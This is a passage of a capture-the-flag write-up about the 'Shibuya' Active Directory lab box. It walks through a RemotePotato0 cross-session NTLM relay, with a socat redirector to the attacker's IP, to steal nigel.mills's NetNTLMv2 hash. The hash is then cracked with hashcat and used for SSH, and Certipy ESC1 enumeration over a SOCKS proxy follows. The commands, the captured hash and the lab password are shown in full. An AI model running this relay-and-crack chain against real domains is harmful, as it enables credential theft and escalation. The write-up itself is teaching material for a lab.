2025-05-12T18:10:04.5803208-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for SHIBUYA.VL
2025-05-12T18:10:04.6896955-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for SHIBUYA.VL
2025-05-12T18:10:05.4084454-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for SHIBUYA.VL
2025-05-12T18:10:31.8615686-07:00|INFORMATION|Consumers finished, closing output channel
Closing writers
2025-05-12T18:10:31.8771961-07:00|INFORMATION|Output channel closed, waiting for output task to complete
2025-05-12T18:10:32.0334496-07:00|INFORMATION|Status: 845 objects finished (+845 31.2963)/s -- Using 55 MB RAM
2025-05-12T18:10:32.0490728-07:00|INFORMATION|Enumeration finished in 00:00:27.9109071
2025-05-12T18:10:32.2053216-07:00|INFORMATION|Saving cache with stats: 19 ID to type mappings.
 1 name to SID mappings.
 1 machine sid mappings.
 4 sid to domain mappings.
 0 global catalog mappings.
2025-05-12T18:10:32.2053216-07:00|INFORMATION|SharpHound Enumeration Completed at 6:10 PM on 5/12/2025! Happy Graphing!

```

I’ll `scp` the results back to my host:

```

oxdf@hacky$ scp -i ~/keys/ed25519_gen simon.watson@shibuya.vl:/programdata/20250512181005_BloodHound.zip .
20250512181005_BloodHound.zip              100%   66KB 179.0KB/s   00:00

```

I’ll upload this zip into Bloodhound.

#### Analysis

Red is a computer account (which explains why it couldn’t authenticate with NTLM above):

![image-20250512210402030](/img/image-20250512210402030.png)

It has access to come ADCS enrollments. purple looks exactly the same.

scv\_autojoin doesn’t have any interesting outbound control other than the certificates that all users can enroll in:

![image-20250512210535328](/img/image-20250512210535328.png)

simon.watson has only the same as far as outbound control. However, they also have a session on AWSJPDC0522. This isn’t surprising, as it’s likely my SSH session. Still, if I go to AWSJPDC0522 and look at it’s sessions, there’s both simon.watson and nigel.mills:

![image-20250512210736806](/img/image-20250512210736806.png)

### Cross Session Relay

#### Background

[RemotePotato0](https://github.com/antonioCoco/RemotePotato0) is an exploit to abuse the

> DCOM activation service and trigger an NTLM authentication of any user currently logged on in the target machine. It is required that a privileged user is logged on the same machine (e.g. a Domain Admin user). Once the NTLM type1 is triggered we setup a cross protocol relay server that receive the privileged type1 message and relay it to a third resource by unpacking the RPC protocol and packing the authentication over HTTP. On the receiving end you can setup a further relay node (eg. ntlmrelayx) or relay directly to a privileged resource. RemotePotato0 also allows to grab and steal NTLMv2 hashes of every users logged on a machine.

I used this same technique in [Rebound](/2024/03/30/htb-rebound.html#cross-session-relay).

#### Get Session ID

I’ll need the session ID for the target user. Typically I’d get this with `qwinsta`, but just like in Rebound, it doesn’t work:

```

PS C:\ProgramData> qwinsta *
No session exists for *

```

That’s because I have a non-interactive session. I’ll upload [RunasCs.exe](https://github.com/antonioCoco/RunasCs) and use it with a login type 9 login:

```

PS C:\ProgramData> .\RunasCs.exe whatever whatever qwinsta -l 9

 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE 
>services                                    0  Disc
 rdp-tcp#0         nigel.mills               1  Active
 console                                     2  Conn
 rdp-tcp                                 65536  Listen

```

For type 9 logins it doesn’t actually check the creds, but I need to put something into those arguments. nigel.mills is connected over RDP in session ID 1.

#### RemotePotato0 Fail

I’ll grab the [latest release](https://github.com/antonioCoco/RemotePotato0/releases/tag/1.2) of `RemotePotato0.exe` and upload it via `scp`. To run this and capture the hash of the logged in user, I’ll give it mode 2 and the session id of 1:

```

PS C:\ProgramData> .\RemotePotato0.exe -m 2 -s 1
[!] Detected a Windows Server version not compatible with JuicyPotato, you cannot run the RogueOxidResolver on 127.0.0.1. RogueOxidResolver must be run remotely.
[!] Example Network redirector:
        sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP::9999

```

For this version of Windows, I can’t perform this attack to localhost, so instead I have it connect to my host and then use `socat` to tunnel that back to Shibuya on the target port.

I’ll run the `socat` command on my host just like it says:

```

oxdf@hacky$ sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.129.234.42:9999

```

It hangs, and now I’ll run `RemotePotato0.exe` with an additional `-x` parameter to give it my IP:

```

PS C:\ProgramData> .\RemotePotato0.exe -m 2 -s 1 -x 10.10.14.79
[*] Detected a Windows Server version not compatible with JuicyPotato. RogueOxidResolver must be run remotely. Remember to forward tcp port 135 on (null) to your victim machine on port 9999
[*] Example Network redirector:
        sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP::9999
[*] Starting the RPC server to capture the credentials hash from the user authentication!!
[*] RPC relay server listening on port 9997 ...
[*] Spawning COM object in the session: 1
[*] Calling StandardGetInstanceFromIStorage with CLSID:{5167B42F-C111-47A1-ACC4-8EABE61B0B54}
[*] Starting RogueOxidResolver RPC Server listening on port 9999 ...
[*] IStoragetrigger written: 104 bytes

```

This hangs too. At `socat`, I get:

```

oxdf@hacky$ sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.129.234.42:9999
2025/05/13 01:56:49 socat[233056] E connect(5, AF=2 10.129.234.42:9999, 16): Connection timed out

```

It’s failing to connect to port 9999 on Shibuya.

#### Firewall Enumeration

The current filewall profile is Domain:

```

PS C:\ProgramData> netsh advfirewall show currentprofile

Domain Profile Settings:
----------------------------------------------------------------------
State                                 ON
Firewall Policy                       BlockInbound,AllowOutbound
LocalFirewallRules                    N/A (GPO-store only)
LocalConSecRules                      N/A (GPO-store only)
InboundUserNotification               Disable
RemoteManagement                      Disable
UnicastResponseToMulticast            Enable

Logging:
LogAllowedConnections                 Disable
LogDroppedConnections                 Disable
FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
MaxFileSize                           4096

Ok.

```

The Firewall Policy blocks inbound by default, so unless there’s a rule allowing it, it won’t get in.

ChatGPT wrote me a little PowerShell to show me the details for the rules that are enabled, inbound, and apply to the Domain profile:

```

PS C:\ProgramData> netsh advfirewall firewall show rule name=all |
>> ForEach-Object {
>>     if ($_ -match "^Rule Name:") {
>>         $currentRule = $_
>>         $collect = @($currentRule)
>>     } elseif ($_ -eq "") {
>>         $block = $collect -join "`n"
>>         if (
>>             $block -match "Enabled:\s+Yes" -and
>>             $block -match "Direction:\s+In" -and
>>             $block -match "Profiles:\s+.*Domain" -and
>>             $block -match "Protocol:\s+TCP"
>>         ) {
>>             $block
>>             "`n"
>>         }
>>         $collect = @()
>>     } else {
>>         $collect += $_
>>     }
>> }
Rule Name:                            Custom TCP Allow
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain,Private,Public
Grouping:
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            8000-9000
RemotePort:                           Any
Edge traversal:                       No
Action:                               Allow

Rule Name:                            OpenSSH SSH Server (sshd)
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain,Private,Public
Grouping:                             OpenSSH Server
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            22
RemotePort:                           Any
Edge traversal:                       No
Action:                               Allow

Rule Name:                            Certification Authority Enrollment and Management Protocol (CERTSVC-RPC-EPMAP-IN)
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain,Private,Public
Grouping:                             Certification Authority
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            RPC-EPMap
RemotePort:                           Any
Edge traversal:                       No
Action:                               Allow

Rule Name:                            Certification Authority Enrollment and Management Protocol (CERTSVC-RPC-NP-IN)
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain,Private,Public
Grouping:                             Certification Authority
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            445
RemotePort:                           Any
Edge traversal:                       No
Action:                               Allow

Rule Name:                            Certification Authority Enrollment and Management Protocol (CERTSVC-DCOM-IN)
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain,Private,Public
Grouping:                             Certification Authority
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            135
RemotePort:                           Any
Edge traversal:                       No
Action:                               Allow

Rule Name:                            Certification Authority Enrollment and Management Protocol (CERTSVC-RPC-TCP-IN)
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain,Private,Public
Grouping:                             Certification Authority
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            RPC
RemotePort:                           Any
Edge traversal:                       No
Action:                               Allow

Rule Name:                            File Server Remote Management (SMB-In)
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain,Private,Public
Grouping:                             File Server Remote Management
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            445
RemotePort:                           Any
Edge traversal:                       No
Action:                               Allow

Rule Name:                            File Server Remote Management (WMI-In)
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain,Private,Public
Grouping:                             File Server Remote Management
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            RPC
RemotePort:                           Any
Edge traversal:                       No
Action:                               Allow

Rule Name:                            File Server Remote Management (DCOM-In)
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain,Private,Public
Grouping:                             File Server Remote Management
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            135
RemotePort:                           Any
Edge traversal:                       No
Action:                               Allow

Rule Name:                            RPC Endpoint Mapper (TCP, Incoming)
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain,Private,Public
Grouping:                             DNS Service
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            RPC-EPMap
RemotePort:                           Any
Edge traversal:                       No
Action:                               Allow

Rule Name:                            DNS (TCP, Incoming)
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain,Private,Public
Grouping:                             DNS Service
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            53
RemotePort:                           Any
Edge traversal:                       No
Action:                               Allow

Rule Name:                            RPC (TCP, Incoming)
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain,Private,Public
Grouping:                             DNS Service
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            RPC
RemotePort:                           Any
Edge traversal:                       No
Action:                               Allow

Rule Name:                            Microsoft Key Distribution Service (RPC EPMAP)
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain,Private,Public
Grouping:                             Microsoft Key Distribution Service (RPC EPMAP)
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            RPC-EPMap
RemotePort:                           Any
Edge traversal:                       No
Action:                               Allow

Rule Name:                            Active Directory Domain Controller - Secure LDAP (TCP-In)
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain,Private,Public
Grouping:                             Active Directory Domain Services
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            636
RemotePort:                           Any
Edge traversal:                       No
Action:                               Allow

Rule Name:                            Active Directory Domain Controller (RPC-EPMAP)
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain,Private,Public
Grouping:                             Active Directory Domain Services
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            RPC-EPMap
RemotePort:                           Any
Edge traversal:                       No
Action:                               Allow

Rule Name:                            Active Directory Domain Controller - Secure LDAP for Global Catalog (TCP-In)
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain,Private,Public
Grouping:                             Active Directory Domain Services
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            3269
RemotePort:                           Any
Edge traversal:                       No
Action:                               Allow

Rule Name:                            Active Directory Domain Controller - LDAP for Global Catalog (TCP-In)
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain,Private,Public
Grouping:                             Active Directory Domain Services
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            3268
RemotePort:                           Any
Edge traversal:                       No
Action:                               Allow

Rule Name:                            Active Directory Domain Controller - LDAP (TCP-In)
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain,Private,Public
Grouping:                             Active Directory Domain Services
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            389
RemotePort:                           Any
Edge traversal:                       No
Action:                               Allow

Rule Name:                            Active Directory Domain Controller (RPC)
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain,Private,Public
Grouping:                             Active Directory Domain Services
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            RPC
RemotePort:                           Any
Edge traversal:                       No
Action:                               Allow

Rule Name:                            File Replication (RPC)
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain,Private,Public
Grouping:                             File Replication
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            RPC
RemotePort:                           Any
Edge traversal:                       No
Action:                               Allow

Rule Name:                            DFS Replication (RPC-In)
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain,Private,Public
Grouping:                             DFS Replication
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            RPC
RemotePort:                           Any
Edge traversal:                       No
Action:                               Allow

Rule Name:                            Active Directory Domain Controller - SAM/LSA (NP-TCP-In)
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain,Private,Public
Grouping:                             Active Directory Domain Services
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            445
RemotePort:                           Any
Edge traversal:                       No
Action:                               Allow

Rule Name:                            File Replication (RPC-EPMAP)
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain,Private,Public
Grouping:                             File Replication
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            RPC-EPMap
RemotePort:                           Any
Edge traversal:                       No
Action:                               Allow

Rule Name:                            DFS Replication (RPC-EPMAP)
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain,Private,Public
Grouping:                             DFS Replication
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            RPC-EPMap
RemotePort:                           Any
Edge traversal:                       No
Action:                               Allow

Rule Name:                            DFS Management (WMI-In)
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain,Private,Public
Grouping:                             DFS Management
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            RPC
RemotePort:                           Any
Edge traversal:                       No
Action:                               Allow

Rule Name:                            DFS Management (SMB-In)
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain,Private,Public
Grouping:                             DFS Management
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            445
RemotePort:                           Any
Edge traversal:                       No
Action:                               Allow

Rule Name:                            Kerberos Key Distribution Center - PCR (TCP-In)
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain,Private,Public
Grouping:                             Kerberos Key Distribution Center
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            464
RemotePort:                           Any
Edge traversal:                       No
Action:                               Allow

Rule Name:                            Active Directory Web Services (TCP-In)
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain,Private,Public
Grouping:                             Active Directory Web Services
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            9389
RemotePort:                           Any
Edge traversal:                       No
Action:                               Allow

Rule Name:                            DFS Management (DCOM-In)
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain,Private,Public
Grouping:                             DFS Management
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            135
RemotePort:                           Any
Edge traversal:                       No
Action:                               Allow

Rule Name:                            DFS Management (TCP-In)
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain,Private,Public
Grouping:                             DFS Management
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            RPC
RemotePort:                           Any
Edge traversal:                       No
Action:                               Allow

Rule Name:                            Microsoft Key Distribution Service (RPC)
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain,Private,Public
Grouping:                             Microsoft Key Distribution Service (RPC)
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            RPC
RemotePort:                           Any
Edge traversal:                       No
Action:                               Allow

Rule Name:                            Kerberos Key Distribution Center (TCP-In)
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain,Private,Public
Grouping:                             Kerberos Key Distribution Center
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            88
RemotePort:                           Any
Edge traversal:                       No
Action:                               Allow

Rule Name:                            Custom Block TCP
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain,Private,Public
Grouping:
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            389,636,5985
RemotePort:                           Any
Edge traversal:                       No
Action:                               Block

Rule Name:                            Cast to Device streaming server (HTTP-Streaming-In)
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain
Grouping:                             Cast to Device functionality
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            10246
RemotePort:                           Any
Edge traversal:                       No
Action:                               Allow

Rule Name:                            Remote Desktop - User Mode (TCP-In)
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain,Private,Public
Grouping:                             Remote Desktop
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            3389
RemotePort:                           Any
Edge traversal:                       No
Action:                               Allow

Rule Name:                            AllJoyn Router (TCP-In)
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain,Private
Grouping:                             AllJoyn Router
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            9955
RemotePort:                           Any
Edge traversal:                       No
Action:                               Allow

Rule Name:                            Core Networking - IPHTTPS (TCP-In)
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain,Private,Public
Grouping:                             Core Networking
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            IPHTTPS
RemotePort:                           Any
Edge traversal:                       No
Action:                               Allow

Rule Name:                            File and Printer Sharing (SMB-In)
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain,Private,Public
Grouping:                             File and Printer Sharing
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            445
RemotePort:                           Any
Edge traversal:                       No
Action:                               Allow

Rule Name:                            Remote Desktop - Shadow (TCP-In)
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain,Private,Public
Grouping:                             Remote Desktop
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            Any
RemotePort:                           Any
Edge traversal:                       Defer to application
Action:                               Allow

Rule Name:                            File and Printer Sharing (NB-Session-In)
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain,Private,Public
Grouping:                             File and Printer Sharing
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            139
RemotePort:                           Any
Edge traversal:                       No
Action:                               Allow

Rule Name:                            Microsoft Media Foundation Network Source IN [TCP 554]
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain,Private,Public
Grouping:                             Microsoft Media Foundation Network Source
LocalIP:                              Any
RemoteIP:                             LocalSubnet
Protocol:                             TCP
LocalPort:                            554,8554-8558
RemotePort:                           Any
Edge traversal:                       No
Action:                               Allow

Rule Name:                            File and Printer Sharing (Spooler Service - RPC-EPMAP)
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain,Private,Public
Grouping:                             File and Printer Sharing
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            RPC-EPMap
RemotePort:                           Any
Edge traversal:                       No
Action:                               Allow

Rule Name:                            DIAL protocol server (HTTP-In)
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain
Grouping:                             DIAL protocol server
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            10247
RemotePort:                           Any
Edge traversal:                       No
Action:                               Allow

Rule Name:                            Windows Management Instrumentation (DCOM-In)
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain,Private,Public
Grouping:                             Windows Management Instrumentation (WMI)
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            135
RemotePort:                           Any
Edge traversal:                       No
Action:                               Allow

Rule Name:                            Delivery Optimization (TCP-In)
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain,Private,Public
Grouping:                             Delivery Optimization
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            7680
RemotePort:                           Any
Edge traversal:                       Yes
Action:                               Allow

Rule Name:                            Windows Remote Management (HTTP-In)
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain,Private
Grouping:                             Windows Remote Management
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            5985
RemotePort:                           Any
Edge traversal:                       No
Action:                               Allow

Rule Name:                            Windows Management Instrumentation (WMI-In)
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain,Private,Public
Grouping:                             Windows Management Instrumentation (WMI)
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            Any
RemotePort:                           Any
Edge traversal:                       No
Action:                               Allow

Rule Name:                            Windows Management Instrumentation (ASync-In)
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain,Private,Public
Grouping:                             Windows Management Instrumentation (WMI)
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            Any
RemotePort:                           Any
Edge traversal:                       No
Action:                               Allow

Rule Name:                            Cast to Device streaming server (RTSP-Streaming-In)
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain
Grouping:                             Cast to Device functionality
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            23554,23555,23556
RemotePort:                           Any
Edge traversal:                       No
Action:                               Allow

Rule Name:                            File and Printer Sharing (Spooler Service - RPC)
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain,Private,Public
Grouping:                             File and Printer Sharing
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            RPC
RemotePort:                           Any
Edge traversal:                       No
Action:                               Allow

```

The first rule is named Custom TCP Allow, and allows 8000-9000 in.

#### RemotePotato0 Success

I’ll pick a port in that range, 8888, and update the `socat` listener:

```

oxdf@hacky$ sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.129.234.42:8888

```

It’s still listening on 135, but now it’s forwarding that to 8888 on Shibuya. I’ll run `RemotePotato0.exe` with an addition argument setting the port to listen on to 8888:

```

PS C:\ProgramData> .\RemotePotato0.exe -m 2 -s 1 -x 10.10.14.79 -p 8888
[*] Detected a Windows Server version not compatible with JuicyPotato. RogueOxidResolver must be run remotely. Remember to forward tcp port 135 on (null) to your victim machine on port 8888
[*] Example Network redirector:
        sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP::8888
[*] Starting the RPC server to capture the credentials hash from the user authentication!!
[*] RPC relay server listening on port 9997 ...
[*] Spawning COM object in the session: 1
[*] Calling StandardGetInstanceFromIStorage with CLSID:{5167B42F-C111-47A1-ACC4-8EABE61B0B54}
[*] Starting RogueOxidResolver RPC Server listening on port 8888 ...
[*] IStoragetrigger written: 104 bytes
[*] ServerAlive2 RPC Call
[*] ResolveOxid2 RPC call
[+] Received the relayed authentication on the RPC relay server on port 9997
[*] Connected to RPC Server 127.0.0.1 on port 8888
[+] User hash stolen!

NTLMv2 Client   : AWSJPDC0522
NTLMv2 Username : SHIBUYA\Nigel.Mills
NTLMv2 Hash     : Nigel.Mills::SHIBUYA:f52be56e934b2cc4:806247512fbce989410edfdc281d07bd:010100000000000092a22027acc3db0181cf5dba1be2dbae0000000002000e005300480049004200550059004100010016004100570053004a0050004400430030003500320032000400140073006800690062007500790061002e0076006c0003002c004100570053004a0050004400430030003500320032002e0073006800690062007500790061002e0076006c000500140073006800690062007500790061002e0076006c000700080092a22027acc3db01060004000600000008003000300000000000000001000000002000002e3417c6809a0b8d004aa8655a76c63b61f22c6a8a02f0555cb9c7f6f8a4079e0a00100000000000000000000000000000000000090000000000000000000000

```

nigel.mills tries to authenticate to 135 on my host, which is forwarded back to 8888 on Shibuya, which coerces a NetNTLMv2 back to my host where it’s captured.

### Crack Password

I’ll pass that hash to `hashcat` with `rockyou.txt`:

```

$ hashcat nigel.mills.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt 
hashcat (v6.2.6) starting in autodetect mode
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

5600 | NetNTLMv2 | Network Protocol
...[snip]...
NIGEL.MILLS::SHIBUYA:f52be56e934b2cc4:806247512fbce989410edfdc281d07bd:010100000000000092a22027acc3db0181cf5dba1be2dbae0000000002000e005300480049004200550059004100010016004100570053004a0050004400430030003500320032000400140073006800690062007500790061002e0076006c0003002c004100570053004a0050004400430030003500320032002e0073006800690062007500790061002e0076006c000500140073006800690062007500790061002e0076006c000700080092a22027acc3db01060004000600000008003000300000000000000001000000002000002e3417c6809a0b8d004aa8655a76c63b61f22c6a8a02f0555cb9c7f6f8a4079e0a00100000000000000000000000000000000000090000000000000000000000:Sail2Boat3
...[snip]...

```

It cracks to “Sail2Boat3” very quickly.

### SSH

I’ll use that password to get an SSH session as nigel.mills:

```

oxdf@hacky$ sshpass -p 'Sail2Boat3' ssh nigel.mills@shibuya.vl
Microsoft Windows [Version 10.0.20348.3453]
(c) Microsoft Corporation. All rights reserved.

shibuya\nigel.mills@AWSJPDC0522 C:\Users\nigel.mills>

```
*Disclaimer - I like to use `sshpass` to pass passwords via the command line for CTF blog posts because it makes it very clear what I’m doing. Never enter real credentials into the command line like this.*

## Shell as \_admin

### Enumeration

#### Filesystem

nigel.mills doesn’t really have access to anything additional interesting on the host. Their home directory is pretty empty:

```

shibuya\nigel.mills@AWSJPDC0522 C:\Users\nigel.mills>tree /f 
Folder PATH listing
Volume serial number is 46FF-CF3D
C:.
├───3D Objects
├───Contacts
├───Desktop
│       AWSJPDC0522.rdp
│       Microsoft Edge.lnk
│
├───Documents
├───Downloads
├───Favorites
│   │   Bing.url
│   │
│   └───Links
├───Links
│       Desktop.lnk
│       Downloads.lnk
│
├───Music
├───Pictures
├───Saved Games
├───Searches
└───Videos

```

#### Bloodhound

In addition to Domain Users, nigel.mills is also a member of the T1\_Admins group, which provides enrollment privileges for the SHIBUYAWEB certificate:

![image-20250513143112255](/img/image-20250513143112255.png)

Just looking at the properties of the certificate, it meets all [the requirements](https://www.crowe.com/cybersecurity-watch/exploiting-ad-cs-a-quick-look-at-esc1-esc8) for ESC1:

![image-20250513143524133](/img/image-20250513143524133.png)

### ESC1

#### Identify as Vulnerable

Even without noticing this certificate is vulnerable to ESC1, I can run [Certipy](https://github.com/ly4k/Certipy) to check for vulnerabilities in the accessible certificates. `certipy` will need to connect to LDAP, so I’ll reconnect a SSH session with `-D 1080`, which gives a socks proxy over the SSH session listening on my host on TCP 1080.

I’ll make sure my `/etc/proxychains.conf` file has 1080 as the only chain:

```

oxdf@hacky$ tail -1 /etc/proxychains.conf
socks5  127.0.0.1 1080

```

I’ll use nigel.mills to query for vulnerable certificates over proxychains:

```

oxdf@hacky$ proxychains certipy find -vulnerable -u nigel.mills -p Sail2Boat3 -dc-ip 127.0.0.1 -stdout
ProxyChains-3.1 (http://proxychains.sf.net)
Certipy v4.8.2 - by Oliver Lyak (ly4k)

|S-chain|-<>-127.0.0.1:1080-<><>-127.0.0.1:636-<><>-OK
[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'shibuya-AWSJPDC0522-CA' via CSRA
|S-chain|-<>-127.0.0.1:1080-<><>-10.129.234.42:135-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-10.129.234.42:62637-<><>-OK
[!] Got error while trying to get CA configuration for 'shibuya-AWSJPDC0522-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'shibuya-AWSJPDC0522-CA' via RRP
|S-chain|-<>-127.0.0.1:1080-<><>-10.129.234.42:445-<><>-OK
[*] Got CA configuration for 'shibuya-AWSJPDC0522-CA'
|S-chain|-<>-127.0.0.1:1080-<><>-10.129.234.42:80-<><>-OK
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : shibuya-AWSJPDC0522-CA
    DNS Name                            : AWSJPDC0522.shibuya.vl
